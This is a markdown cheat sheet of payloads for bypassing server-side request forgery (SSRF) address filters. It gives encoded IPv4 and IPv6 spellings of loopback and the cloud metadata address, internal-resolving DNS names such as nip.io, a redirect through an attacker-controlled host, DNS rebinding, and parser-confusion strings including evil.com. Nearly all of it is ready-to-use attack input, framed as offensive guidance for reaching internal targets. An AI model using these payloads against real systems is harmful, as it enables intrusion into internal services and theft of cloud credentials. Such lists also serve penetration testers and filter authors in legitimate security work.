# SSRF address-filter bypass catalogue — Open WHEN: a confirmed fetcher rejects `127.0.0.1` / `localhost` / `169.254.169.254` and you need an alternate spelling to reach the internal target

The reach is the hard part of the SSRF chain. Naive internal addresses are
usually blocklisted; cycle these representations until one resolves inward.
Different URL parsers (Python `requests`, `urllib`, Java, Go, browsers) split
a URL differently, so the same string can pass validation yet fetch a
different host. Try several — the bypass that works depends on the library.

## Loopback synonyms

```
http://localhost/        http://0.0.0.0/        http://0/
http://127.0.0.1/        http://127.1/          http://127.0.1/
http://127.127.127.127/  (any 127.0.0.0/8 address loops back)
```

## Encoded IPv4 (one host, many spellings)

`127.0.0.1`:
```
http://2130706433/        decimal
http://0x7f000001/        hex (dotless)
http://0x7f.0x0.0x0.0x1/  hex (dotted)
http://0177.0.0.1/        octal
http://0177.0.0.01/       octal padded
```

`169.254.169.254` (cloud metadata):
```
http://2852039166/             decimal
http://0xa9fea9fe/             hex
http://0xA9.0xFE.0xA9.0xFE/    dotted hex
http://0251.0376.0251.0376/    octal
http://425.510.425.510/        dotted decimal w/ overflow
http://0251.254.169.254/       mixed octal + decimal
```

Overflow forms also pass some parsers: `http://7147006462/`,
`http://0x41414141A9FEA9FE/`.

## IPv6 notation

```
http://[::]/                       unspecified
http://[0000::1]/                  loopback
http://[::ffff:127.0.0.1]/         IPv4-mapped loopback
http://[0:0:0:0:0:ffff:127.0.0.1]/ expanded form
http://[::ffff:a9fe:a9fe]/         metadata, compressed
http://[fd00:ec2::254]/            AWS IMDS IPv6 endpoint
```

## DNS that resolves to an internal IP

These public DNS names point inward — they pass a hostname allowlist yet the
server connects to loopback/metadata:

```
http://127.0.0.1.nip.io/      nip.io maps <anything>.<IP>.nip.io -> <IP>
http://localtest.me/          -> ::1
http://localh.st/             -> 127.0.0.1
http://instance-data/         -> AWS metadata (DNS alias)
http://169.254.169.254.nip.io/
```

## Redirect-based bypass

If only the *first* URL is validated, point the fetcher at a host you control
that redirects to the internal target. Use **307/308** to preserve the HTTP
method and body (302 may drop them):

```
1. host  http://yourhost/redir  ->  302/307 Location: http://169.254.169.254/...
2. fetch ssrf.php?url=http://yourhost/redir
```

## DNS rebinding (TOCTOU)

A name that resolves to a safe IP on validation and to the internal IP on the
actual fetch. Useful when validation and connection are separate lookups.
Rotate a domain between two IPs (e.g. via a rebinding service) and confirm
with `nslookup` that both answers appear.

## URL-parser confusion

Embedding credentials/fragments makes parsers disagree on the real host:

```
http://expected-host@127.0.0.1/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/            (some parsers normalise to http://127.0.0.1/)
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/   (each library picks a different host)
```

## PHP `filter_var(FILTER_VALIDATE_URL)` quirks

Passes validation yet fetches the second host:
```
http://test???test.com
0://evil.com:80;http://internal-target:80/
```

## Encoding the path/host characters

```
http://127.0.0.1/%2561dmin       double URL-encode to slip a blocklist
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ            enclosed-alphanumeric -> example.com
```
In .NET / Python3 regex, `\d` also matches non-ASCII digits like `๐๑๒`, so a
numeric filter built on `\d` can be fed unicode digits.
